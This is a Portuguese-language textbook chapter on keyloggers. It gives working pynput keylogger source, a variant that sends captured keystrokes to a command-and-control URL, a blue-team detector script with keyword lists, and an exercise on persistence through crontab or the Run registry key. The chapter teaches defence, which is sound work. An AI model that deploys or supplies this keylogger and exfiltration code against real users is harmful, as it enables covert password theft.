# Capítulo 14 — Keylogger + Detector

**Objetivos deste capítulo:**
- Entender como keyloggers funcionam
- Construir um keylogger simples (Red Team)
- Construir um detector de keyloggers (Blue Team)
- Conhecer técnicas de persistência e detecção

---

## O que é um keylogger?

Keylogger é um programa que registra (faz log) de cada tecla digitada no teclado. Pode ser usado para:
- Monitoramento parental (uso legítimo)
- Investigação forense (uso legítimo)
- Roubo de senhas (uso malicioso)

---

## Keylogger com pynput

```bash
pip install pynput
```

```python
#!/usr/bin/env python3
"""
Keylogger educacional.
Uso: python3 keylogger.py
AVISO: Use apenas em seus próprios dispositivos.
"""

from pynput import keyboard
import logging
from datetime import datetime

# Configuração do arquivo de log
logging.basicConfig(
    filename=f"keylog_{datetime.now().strftime('%Y%m%d')}.txt",
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s'
)

def ao_pressionar(tecla):
    """Callback para quando uma tecla é pressionada."""
    try:
        # Teclas normais (letras, números)
        logging.info(f"{tecla.char}")
    except AttributeError:
        # Teclas especiais (Shift, Enter, etc.)
        nome = str(tecla).replace("Key.", "")
        if nome == "space":
            logging.info(" ")
        elif nome == "enter":
            logging.info("\n")
        elif nome == "tab":
            logging.info("\t")
        elif nome == "backspace":
            logging.info("[BACKSPACE]")
        elif nome == "esc":
            logging.info("[ESC]")
            return False  # Para o keylogger
        else:
            logging.info(f"[{nome.upper()}]")

def ao_soltar(tecla):
    """Callback para quando uma tecla é solta."""
    if tecla == keyboard.Key.esc:
        return False  # Para o listener

print("Keylogger iniciado. Pressione ESC para parar.")
print(f"Log salvando em keylog_{datetime.now().strftime('%Y%m%d')}.txt")

with keyboard.Listener(
    on_press=ao_pressionar,
    on_release=ao_soltar
) as listener:
    listener.join()

print("Keylogger encerrado.")
```

---

## Keylogger com envio remoto

A versão acima salva localmente. Um keylogger real geralmente envia os dados para um servidor remoto:

```python
import requests
import time
from pynput import keyboard

# Configuração do servidor C2
C2_URL = "http://seu-servidor.com:8000/log"

buffer = []

def ao_pressionar(tecla):
    try:
        buffer.append(tecla.char)
    except AttributeError:
        nome = str(tecla).replace("Key.", "")
        if nome == "space":
            buffer.append(" ")
        elif nome == "enter":
            buffer.append("\n")
        elif nome == "esc":
            # Envia buffer antes de sair
            enviar_buffer()
            return False
        else:
            buffer.append(f"[{nome.upper()}]")

    # Envia a cada 20 teclas
    if len(buffer) >= 20:
        enviar_buffer()

def enviar_buffer():
    if not buffer:
        return
    dados = "".join(buffer)
    try:
        requests.post(C2_URL, data={"log": dados}, timeout=3)
        buffer.clear()
    except:
        pass  # Não quebrar o keylogger se falhar conexão

with keyboard.Listener(on_press=ao_pressionar) as listener:
    listener.join()
```

---

## Detector de keyloggers (Blue Team)

Keyloggers deixam rastros. Vamos construir um detector que procura por:

1. Processos suspeitos (hooks de teclado)
2. Arquivos de log suspeitos
3. Conexões de rede anômalas

```python
#!/usr/bin/env python3
"""
Detector de Keyloggers.
Uso: python3 detectar_keylogger.py
"""

import os
import psutil
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO, format="%(message)s")
log = logging.getLogger(__name__)

def verificar_processos():
    """Procura por processos suspeitos (hooks de teclado)."""
    suspeitos = []
    for proc in psutil.process_iter(['pid', 'name', 'connections']):
        try:
            nome = proc.info['name'] or ''
            nome_lower = nome.lower()

            # Palavras-chave comuns em keyloggers
            palavras_chave = ['keylog', 'hook', 'pynput', 'keyboard', 'capture']

            for palavra in palavras_chave:
                if palavra in nome_lower:
                    suspeitos.append((proc.info['pid'], nome))
                    break

        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

    return suspeitos

def verificar_arquivos_log():
    """Procura por arquivos de log suspeitos em diretórios comuns."""
    diretorios = [os.path.expanduser("~"), "/tmp", "/var/log"]
    padroes = ["keylog", "keystroke", "capture"]

    encontrados = []
    for diretorio in diretorios:
        if not os.path.exists(diretorio):
            continue
        for arquivo in os.listdir(diretorio):
            for padrao in padroes:
                if padrao in arquivo.lower():
                    caminho = os.path.join(diretorio, arquivo)
                    if os.path.isfile(caminho):
                        encontrados.append(caminho)
    return encontrados

def verificar_conexoes_rede():
    """Verifica conexões de rede suspeitas."""
    conexoes = []
    for conn in psutil.net_connections():
        if conn.status == 'ESTABLISHED' and conn.raddr:
            ip, porta = conn.raddr
            # Ignora conexões locais comuns
            if not ip.startswith(("127.", "192.168.", "10.", "172.")):
                conexoes.append((ip, porta))
    return conexoes

print(f"=== Detector de Keyloggers ===")
print(f"Executado em: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

# 1. Processos
print("[1] Verificando processos suspeitos...")
suspeitos = verificar_processos()
if suspeitos:
    log.warning(f"  ⚠ Processos suspeitos encontrados:")
    for pid, nome in suspeitos:
        print(f"    PID {pid}: {nome}")
else:
    print(f"  ✅ Nenhum processo suspeito.")

# 2. Arquivos
print("\n[2] Verificando arquivos de log suspeitos...")
arquivos = verificar_arquivos_log()
if arquivos:
    log.warning(f"  ⚠ Arquivos suspeitos encontrados:")
    for a in arquivos:
        print(f"    {a}")
else:
    print(f"  ✅ Nenhum arquivo suspeito.")

# 3. Conexões
print("\n[3] Verificando conexões de rede externas...")
conexoes = verificar_conexoes_rede()
if conexoes:
    print(f"  ℹ Conexões externas encontradas:")
    for ip, porta in conexoes:
        print(f"    {ip}:{porta}")
    print("  (Analise manual recomendada)")
else:
    print(f"  ✅ Nenhuma conexão externa suspeita.")
```

---

## Exercícios

### Exercício 1 — Keylogger com horário

Modifique o keylogger para registrar também o horário de cada tecla. Use `datetime.now().isoformat()`.

### Exercício 2 — Detector de hooks

Pesquise sobre `SetWindowsHookEx` (Windows) e crie um detector que verifique se há hooks de teclado globais instalados.

Dica: no Linux, verifique `/proc/modules` por módulos de captura de teclado.

### Exercício 3 — Keylogger em background

Faça o keylogger rodar em background e se auto-instalar na inicialização do sistema (Linux: crontab, Windows: registro Run).

---

## Resumo

- **Keyloggers** capturam teclas digitadas — podem ser hardware ou software
- **pynput** permite capturar teclas em Python com poucas linhas
- **Detectores** procuram por: processos com nomes suspeitos, arquivos de log, conexões externas
- Defesa: antivírus, monitoramento de processos, auditoria de inicialização

No próximo capítulo, construímos um **monitor de integridade de arquivos em tempo real**.